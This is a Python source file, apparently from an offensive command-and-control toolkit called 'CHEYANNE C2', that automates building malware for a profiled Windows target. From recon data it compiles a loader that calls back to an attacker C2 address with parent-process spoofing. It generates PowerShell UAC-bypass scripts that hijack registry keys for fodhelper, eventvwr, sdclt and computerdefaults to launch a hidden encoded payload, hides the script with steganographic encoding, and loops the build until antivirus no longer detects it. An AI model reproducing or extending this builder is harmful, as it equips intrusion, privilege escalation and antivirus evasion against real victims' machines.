#!/usr/bin/env python3
"""
payload_auto.py -- CHEYANNE C2 Automated Payload Builder
22DIV / george wu

Reads a recon JSON (from recon_drop.ps1) and builds a tailored payload
package: ghost_loader FUD'd to target AV level + optional UAC bypass PS1.

Usage:
    python payload_auto.py <recon_json> <c2_ip> [c2_port]
    python payload_auto.py recon.json 192.168.1.92 4443

Importable:
    from payload_auto import run_build
    result = run_build("recon.json", "192.168.1.92", 4443)
"""

import os
import sys
import json
import shutil
import base64
import subprocess

if sys.platform == "win32":
    os.system("")  # enable ANSI on Windows
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

ROOT      = os.path.dirname(os.path.abspath(__file__))
SHELL_DIR = os.path.join(ROOT, "shell")

# ── ANSI palette (matched to vader_menu.py / rainfantry.github.io) ────────────
GREEN  = "\033[38;2;0;255;65m"
GREEN2 = "\033[38;2;0;204;51m"
AMBER  = "\033[38;2;255;176;0m"
RED    = "\033[38;2;255;68;68m"
CYAN   = "\033[38;2;68;136;255m"
DIM    = "\033[38;2;85;85;85m"
MUTED  = "\033[38;2;136;136;136m"
BOLD   = "\033[1m"
RST    = "\033[0m"

def ok(m):   print(f"  {GREEN}[+]{RST} {m}")
def info(m): print(f"  {CYAN}[*]{RST} {m}")
def fail(m): print(f"  {RED}[!]{RST} {m}")
def warn(m): print(f"  {AMBER}[~]{RST} {m}")
def hdr(m):  print(f"\n{BOLD}{GREEN}{m}{RST}")
def hl():    print(f"  {DIM}{'─'*60}{RST}")


# ═══════════════════════════════════════════════════════════════
# LOAD RECON
# ═══════════════════════════════════════════════════════════════

def load_recon(path):
    """
    Load and validate recon JSON from recon_drop.ps1 output.
    Returns parsed dict. Raises ValueError if required keys missing.
    """
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)

    required = [
        "hostname", "username", "is_admin", "uac_enabled",
        "payload_recommendations",
    ]
    missing = [k for k in required if k not in data]
    if missing:
        raise ValueError(f"Recon JSON missing required keys: {missing}")

    pr = data["payload_recommendations"]
    pr_required = ["fud_level", "ps_amsi_bypass_needed", "needs_privesc",
                   "best_privesc", "arch"]
    pr_missing = [k for k in pr_required if k not in pr]
    if pr_missing:
        raise ValueError(f"payload_recommendations missing keys: {pr_missing}")

    return data


# ═══════════════════════════════════════════════════════════════
# SELECT STRATEGY
# ═══════════════════════════════════════════════════════════════

def select_strategy(recon):
    """
    Build a strategy dict from recon payload_recommendations.
    Always sets v3_loader=True (parent spoof).
    """
    pr = recon["payload_recommendations"]
    return {
        "fud_level":      pr["fud_level"],
        "amsi_bypass":    pr["ps_amsi_bypass_needed"],
        "needs_privesc":  pr["needs_privesc"],
        "privesc_method": pr["best_privesc"],
        "arch":           pr["arch"],
        "v3_loader":      True,
    }


# ═══════════════════════════════════════════════════════════════
# BUILD PRIVESC PS1
# ═══════════════════════════════════════════════════════════════

def build_privesc_ps1(method, c2_ip, c2_port, out_path):
    """
    Generate a UAC bypass PS1 that elevates via the chosen method,
    then launches the ghost shell payload with a hidden window.

    Supported methods: fodhelper, eventvwr, sdclt, computerdefaults
    Fallback (none/unknown): direct shell launch
    """
    # The inner payload: hidden PS reverse shell that loads ghost_loader
    # Base64-encode a minimal PS1 stager pointing at ghost_loader path
    inner_ps = (
        f"$p='{os.path.join(SHELL_DIR, 'ghost_fud.exe').replace(chr(92), chr(92)*2)}';"
        f"Start-Process $p -WindowStyle Hidden"
    )
    b64_inner = base64.b64encode(inner_ps.encode("utf-16-le")).decode()
    encoded_cmd = f"powershell -NoP -NonI -W Hidden -EncodedCommand {b64_inner}"

    # Registry key / exe mappings per method
    method_map = {
        "fodhelper":       {
            "reg_key":  r"HKCU\Software\Classes\ms-settings\Shell\Open\command",
            "exe":      "fodhelper.exe",
        },
        "eventvwr":        {
            "reg_key":  r"HKCU\Software\Classes\mscfile\Shell\Open\command",
            "exe":      "eventvwr.exe",
        },
        "sdclt":           {
            "reg_key":  r"HKCU\Software\Classes\Folder\Shell\Open\command",
            "exe":      "sdclt.exe",
        },
        "computerdefaults":{
            "reg_key":  r"HKCU\Software\Classes\ms-settings\Shell\Open\command",
            "exe":      "computerdefaults.exe",
        },
    }

    if method in method_map:
        cfg = method_map[method]
        reg_key = cfg["reg_key"]
        exe     = cfg["exe"]

        # DelegateExecute trick (required for fodhelper/computerdefaults ms-settings)
        needs_delegate = method in ("fodhelper", "computerdefaults")
        delegate_line  = (
            f'reg add "{reg_key}" /v DelegateExecute /t REG_SZ /d "" /f\n'
            if needs_delegate else ""
        )

        ps1 = f"""# UAC Bypass: {method}
# 22DIV / CHEYANNE C2 -- auto-generated
$ErrorActionPreference = "SilentlyContinue"

# Write command registry key
reg add "{reg_key}" /ve /t REG_SZ /d "{encoded_cmd}" /f
{delegate_line}
# Trigger UAC bypass
Start-Process "{exe}" -Wait -WindowStyle Hidden

# Cleanup registry
reg delete "{reg_key}" /f
"""
    else:
        # Fallback: direct launch, no bypass
        ps1 = f"""# Direct shell launch (no UAC bypass -- already elevated or bypass unavailable)
# 22DIV / CHEYANNE C2 -- auto-generated
$ErrorActionPreference = "SilentlyContinue"
Start-Process "{os.path.join(SHELL_DIR, 'ghost_fud.exe')}" -WindowStyle Hidden
"""

    with open(out_path, "w", encoding="utf-8") as f:
        f.write(ps1)

    return out_path


# ═══════════════════════════════════════════════════════════════
# RUN BUILD
# ═══════════════════════════════════════════════════════════════

def run_build(recon_path, c2_ip, c2_port=4443, output_dir=None):
    """
    Main build orchestrator.

    Steps:
      1. Load + validate recon JSON
      2. Print strategy
      3. Build ghost_loader.exe (v3 parent spoof)
      4. If needs_privesc: build privesc PS1 + ghost-encode it
      5. Run FUD loop (scan-only, max 5 iterations)
      6. Copy FUD result to shell/ghost_fud_<hostname>.exe
      7. Print build summary
      8. Return result dict

    All subprocess calls use sys.executable and cwd=ROOT.
    """
    c2_port = int(c2_port)
    if output_dir is None:
        output_dir = SHELL_DIR
    os.makedirs(output_dir, exist_ok=True)

    # ── 1. Load recon ─────────────────────────────────────────
    hdr("[ CHEYANNE ] PAYLOAD AUTO-BUILD")
    hl()
    info(f"Recon: {recon_path}")

    recon    = load_recon(recon_path)
    hostname = recon.get("hostname", "unknown")
    strategy = select_strategy(recon)

    # ── 2. Print strategy ──────────────────────────────────────
    hdr("[ STRATEGY ]")
    hl()

    fud_color = RED if strategy["fud_level"] == "max" else (
                AMBER if strategy["fud_level"] == "high" else GREEN)

    print(f"  Target    : {BOLD}{hostname}{RST}  ({recon.get('username','')})")
    print(f"  FUD level : {fud_color}{BOLD}{strategy['fud_level'].upper()}{RST}")
    print(f"  AMSI      : {'bypass needed' if strategy['amsi_bypass'] else 'not needed'}")
    print(f"  Privesc   : {'NEEDED' if strategy['needs_privesc'] else 'not needed'}"
          + (f"  method={strategy['privesc_method']}" if strategy["needs_privesc"] else ""))
    print(f"  Arch      : {strategy['arch']}")
    print(f"  Loader    : v3 (parent spoof)")
    hl()

    result = {
        "ghost_fud_path":   None,
        "privesc_ps1_path": None,
        "strategy":         strategy,
    }

    # ── 3. Build ghost_loader.exe ──────────────────────────────
    hdr("[ STEP 1 ] Build ghost_loader.exe")
    hl()

    build_cmd = [
        sys.executable,
        os.path.join(ROOT, "build_ghost_loader.py"),
        str(c2_ip),
        str(c2_port),
        "--v3",
    ]
    info(f"Running: {' '.join(build_cmd)}")

    proc = subprocess.run(
        build_cmd,
        cwd=ROOT,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
    )
    if proc.stdout.strip():
        for line in proc.stdout.strip().splitlines():
            print(f"    {DIM}{line}{RST}")
    if proc.returncode != 0:
        fail("ghost_loader build FAILED")
        if proc.stderr.strip():
            for line in proc.stderr.strip().splitlines()[-5:]:
                print(f"    {RED}{line}{RST}")
        return result

    ghost_loader_path = os.path.join(SHELL_DIR, "ghost_loader.exe")
    if os.path.exists(ghost_loader_path):
        ok(f"ghost_loader.exe built: {ghost_loader_path}")
    else:
        fail("ghost_loader.exe not found after build")
        return result

    # ── 4. Privesc PS1 (if needed) ────────────────────────────
    privesc_ps1_path  = None
    ghost_privesc_path = None

    if strategy["needs_privesc"] and strategy["privesc_method"] != "none":
        hdr("[ STEP 2 ] Build UAC bypass PS1")
        hl()

        privesc_raw_path = os.path.join(
            SHELL_DIR, f"privesc_{hostname}.ps1"
        )
        build_privesc_ps1(
            method   = strategy["privesc_method"],
            c2_ip    = c2_ip,
            c2_port  = c2_port,
            out_path = privesc_raw_path,
        )

        if os.path.exists(privesc_raw_path):
            ok(f"Privesc PS1: {privesc_raw_path}")
        else:
            fail("Privesc PS1 generation failed")

        # Ghost-encode the privesc PS1 (invisible steg encoding)
        ghost_privesc_path = os.path.join(
            SHELL_DIR, f"ghost_privesc_{hostname}.ps1"
        )
        ghost_encode_script = os.path.join(ROOT, "ghost-encoder", "ghost_encode.py")

        # Read raw PS1 content and pass via --raw
        with open(privesc_raw_path, "r", encoding="utf-8") as pf:
            raw_content = pf.read()

        encode_cmd = [
            sys.executable,
            ghost_encode_script,
            "--raw", raw_content,
            "--invisible",
            "-o", ghost_privesc_path,
        ]
        info(f"Ghost-encoding privesc PS1...")

        enc_proc = subprocess.run(
            encode_cmd,
            cwd=ROOT,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        if enc_proc.stdout.strip():
            for line in enc_proc.stdout.strip().splitlines():
                print(f"    {DIM}{line}{RST}")

        if os.path.exists(ghost_privesc_path):
            ok(f"Ghost-encoded privesc: {ghost_privesc_path}")
            privesc_ps1_path = ghost_privesc_path
        else:
            warn("Ghost encode failed -- using plain privesc PS1")
            privesc_ps1_path = privesc_raw_path

        result["privesc_ps1_path"] = privesc_ps1_path
    else:
        info("Privesc not needed -- skipping UAC bypass build")

    # ── 5. FUD loop ────────────────────────────────────────────
    hdr("[ STEP 3 ] FUD auto-build (scan-only, max 5 iter)")
    hl()

    fud_cmd = [
        sys.executable,
        os.path.join(ROOT, "fud_auto.py"),
        "ghost",
        str(c2_ip),
        str(c2_port),
        "--scan-only",
        "--max", "5",
    ]
    info(f"Running: {' '.join(fud_cmd)}")

    fud_proc = subprocess.run(
        fud_cmd,
        cwd=ROOT,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
    )
    if fud_proc.stdout.strip():
        for line in fud_proc.stdout.strip().splitlines():
            print(f"    {DIM}{line}{RST}")
    if fud_proc.returncode != 0:
        warn("FUD loop returned non-zero (may still have produced output)")
        if fud_proc.stderr.strip():
            for line in fud_proc.stderr.strip().splitlines()[-5:]:
                print(f"    {AMBER}{line}{RST}")

    # ── 6. Copy FUD result ──────────────────────────────────────
    hdr("[ STEP 4 ] Locate + copy FUD result")
    hl()

    # fud_auto.py names outputs: fud_output/ghost_fud_ghost_i{n}.exe
    fud_output_dir = os.path.join(ROOT, "fud_output")
    dest_name      = f"ghost_fud_{hostname}.exe"
    dest_path      = os.path.join(output_dir, dest_name)

    # Find the most recently created ghost_fud_ghost_i*.exe
    import glob as _glob
    pattern   = os.path.join(fud_output_dir, "ghost_fud_ghost_i*.exe")
    candidates = sorted(
        _glob.glob(pattern),
        key=os.path.getmtime,
        reverse=True,
    )

    if candidates:
        shutil.copy2(candidates[0], dest_path)
        ok(f"FUD result copied: {dest_path}")
        result["ghost_fud_path"] = dest_path
    else:
        # Fallback: use the plain ghost_loader.exe if FUD produced nothing
        warn("No FUD output found -- falling back to ghost_loader.exe")
        fallback = os.path.join(SHELL_DIR, "ghost_loader.exe")
        if os.path.exists(fallback):
            shutil.copy2(fallback, dest_path)
            warn(f"Fallback copied: {dest_path}")
            result["ghost_fud_path"] = dest_path
        else:
            fail("No payload available to copy")

    # ── 7. Build summary ───────────────────────────────────────
    hdr("[ BUILD COMPLETE ]")
    hl()

    print(f"  Target hostname : {BOLD}{hostname}{RST}")
    print(f"  FUD level       : {fud_color}{strategy['fud_level'].upper()}{RST}")
    print(f"  Arch            : {strategy['arch']}")
    print()

    if result["ghost_fud_path"] and os.path.exists(result["ghost_fud_path"]):
        sz = os.path.getsize(result["ghost_fud_path"])
        ok(f"Ghost FUD EXE   : {result['ghost_fud_path']}  ({sz:,} bytes)")
    else:
        fail("Ghost FUD EXE   : NOT PRODUCED")

    if result["privesc_ps1_path"] and os.path.exists(result["privesc_ps1_path"]):
        ok(f"Privesc PS1     : {result['privesc_ps1_path']}")
        ok(f"Privesc method  : {strategy['privesc_method']}")
    elif strategy["needs_privesc"]:
        warn("Privesc PS1     : not produced (target still needs elevation)")
    else:
        info("Privesc PS1     : not needed (target already admin)")

    hl()
    return result


# ═══════════════════════════════════════════════════════════════
# CLI ENTRY POINT
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: python payload_auto.py <recon_json> <c2_ip> [c2_port]")
        print(f"  recon_json  -- path to JSON from recon_drop.ps1 ($env:TEMP\\chey_recon.json)")
        print(f"  c2_ip       -- attacker C2 IP or hostname")
        print(f"  c2_port     -- C2 port (default: 4443)")
        sys.exit(1)

    recon_json = sys.argv[1]
    c2_ip      = sys.argv[2]
    c2_port    = int(sys.argv[3]) if len(sys.argv) > 3 else 4443

    if not os.path.exists(recon_json):
        fail(f"Recon JSON not found: {recon_json}")
        sys.exit(1)

    try:
        run_build(recon_json, c2_ip, c2_port)
    except Exception as e:
        fail(f"Build error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
